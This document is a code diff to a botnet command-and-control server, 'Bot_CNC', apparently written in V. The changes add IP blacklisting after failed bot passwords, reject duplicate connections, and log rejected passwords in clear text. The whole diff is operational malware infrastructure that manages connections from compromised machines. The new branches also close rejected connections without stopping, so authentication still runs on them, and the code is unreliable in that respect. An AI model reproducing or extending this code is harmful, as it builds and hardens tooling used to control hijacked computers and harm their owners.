@@ -5,6 +5,7 @@ import net
 import time
 import rand
 
+import core.crud
 import core.logger
 
 pub struct Bot_CNC {
@@ -63,6 +64,15 @@ pub fn (mut b Bot_CNC) listener(port string, bot_pw string) {
 			logger.console_log("accept_user_fail", "Unable to accept bot connection....!", true)
 			return
 		}
+		user_addy := bot_conn.peer_addr() or { return }
+		user_ip := "${user_addy}".split("]:")[0].replace("[::ffff:", "")
+		if user_ip in crud.read_blacklist() {
+			bot_conn.close() or { return }
+			logger.console_log("bot_blacklisted", "Blacklisted bot connecting attempt...!", true)
+		} else if user_ip in b.ip {
+			bot_conn.close() or { return }
+			logger.console_log("dupilcate_bot", "Same system trying to connect again...!", true)
+		}
 		bot_conn.set_read_timeout(time.infinite)
 		go b.bot_auth(mut bot_conn, bot_pw)
 	}
@@ -70,12 +80,16 @@ pub fn (mut b Bot_CNC) listener(port string, bot_pw string) {
 
 pub fn (mut b Bot_CNC) bot_auth(mut bot_conn net.TcpConn, bot_pw string) {
 	mut reader := io.new_buffered_reader(reader: bot_conn)
+	user_addy := bot_conn.peer_addr() or { return }
+	user_ip := "${user_addy}".split("]:")[0].replace("[::ffff:", "")
+
 	logger.console_log("requesting_pw", "Requesting bot for password...!", true)
 	hid_pw := reader.read_line() or { "" }
 	
 	if hid_pw.replace("\n", "") != bot_pw {
 		bot_conn.write_string("[x]\n") or { 0 }
-		logger.console_log("invalid_bot_pw", "Bot access denied. Invalid password provided....!", true)
+		crud.blacklist_bot(user_ip)
+		logger.console_log("invalid_bot_pw", "[${user_ip}] Bot access denied. [${hid_pw}] Invalid password provided....!", true)
 		bot_conn.close() or { return }
 		return
 	}
@@ -91,8 +105,6 @@ pub fn (mut b Bot_CNC) bot_auth(mut bot_conn net.TcpConn, bot_pw string) {
 		return
 	}
 
-	user_addy := bot_conn.peer_addr() or { return }
-	user_ip := "${user_addy}".split("]:")[0].replace("[::ffff:", "")
 	logger.console_log("bot_connected", "Bot [${user_ip}][${cpu}] successfully connected.....!", false)
 	b.add_bot_session(b.randomize_nick(), mut bot_conn, cpu, user_ip, "")
 	for {
